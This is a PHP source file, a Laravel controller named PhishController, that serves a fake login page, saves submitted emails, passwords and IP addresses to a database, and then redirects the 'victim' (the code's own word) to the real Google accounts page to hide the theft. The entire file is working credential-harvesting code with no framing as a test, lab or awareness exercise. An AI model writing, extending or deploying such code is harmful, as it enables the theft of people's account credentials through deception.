<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use App\Models\PhishCredential;

class PhishController extends Controller
{
    public function showLogin()
    {
        return view('phish.login');
    }

    public function capture(Request $request)
    {
        PhishCredential::create([
            'email'      => $request->email,
            'password'   => $request->password,
            'ip_address' => $request->ip(),
        ]);

        // Redirect victim to real site OR fake error
        return redirect('https://accounts.google.com');
    }
}
